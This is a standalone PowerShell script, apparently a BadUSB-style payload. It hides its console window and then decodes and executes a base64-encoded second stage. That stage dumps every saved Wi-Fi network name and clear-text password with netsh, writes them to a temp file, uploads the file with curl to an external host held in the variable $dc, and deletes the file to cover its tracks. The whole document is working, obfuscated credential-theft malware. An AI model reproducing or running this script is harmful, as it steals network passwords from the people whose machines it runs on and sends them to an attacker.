$v = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion; $y = $v.Substring(0, 2); if ($y -gt 21) { $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'; $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru; $hwnd = (Get-Process -PID $pid).MainWindowHandle; if ($hwnd -ne [System.IntPtr]::Zero) { $Type::ShowWindowAsync($hwnd, 0) }else { $Host.UI.RawUI.WindowTitle = 'hideme'; $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' }); $hwnd = $Proc.MainWindowHandle; $Type::ShowWindowAsync($hwnd, 0) } }; $s = "JG91dGZpbGUgPSAiIjsgJGEgPSAwOyAkd3MgPSAobmV0c2ggd2xhbiBzaG93IHByb2ZpbGVzKSAtcmVwbGFjZSAiLio6XHMrIjsgZm9yZWFjaCAoJHMgaW4gJHdzKSB7IGlmICgkYSAtZ3QgMSAtQW5kICRzIC1Ob3RNYXRjaCAiIHBvbGljeSAiIC1BbmQgJHMgLW5lICJVc2VyIHByb2ZpbGVzIiAtQW5kICRzIC1Ob3RNYXRjaCAiLS0tLS0iIC1BbmQgJHMgLU5vdE1hdGNoICI8Tm9uZT4iIC1BbmQgJHMubGVuZ3RoIC1ndCA1KSB7ICRzc2lkID0gJHMuVHJpbSgpOyBpZiAoJHMgLU1hdGNoICI6IikgeyAkc3NpZCA9ICRzLlNwbGl0KCI6IilbMV0uVHJpbSgpIH0gJHB3ID0gKG5ldHNoIHdsYW4gc2hvdyBwcm9maWxlcyBuYW1lPSRzc2lkIGtleT1jbGVhcik7ICRwYXNzID0gIk5vbmUiOyBmb3JlYWNoICgkcCBpbiAkcHcpIHsgaWYgKCRwIC1NYXRjaCAiS2V5IENvbnRlbnQiKSB7ICRwYXNzID0gJHAuU3BsaXQoIjoiKVsxXS5UcmltKCk7ICRvdXRmaWxlICs9ICJTU0lEOiAkc3NpZCA6IFBhc3N3b3JkOiAkcGFzc2BuIiB9IH0gfSRhKys7IH07ICRQYXRoID0gIiRlbnY6dGVtcFx3aWZpLnR4dCI7ICRvdXRmaWxlIHwgT3V0LUZpbGUgLUZpbGVQYXRoICRQYXRoIC1FbmNvZGluZyBBU0NJSSAtQXBwZW5kOyBjdXJsLmV4ZSAtRiBmaWxlMT1AIiRQYXRoIiAkZGM7UmVtb3ZlLUl0ZW0gLVBhdGggJFBhdGggLWZvcmNl"; $sd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($s)); iex $sd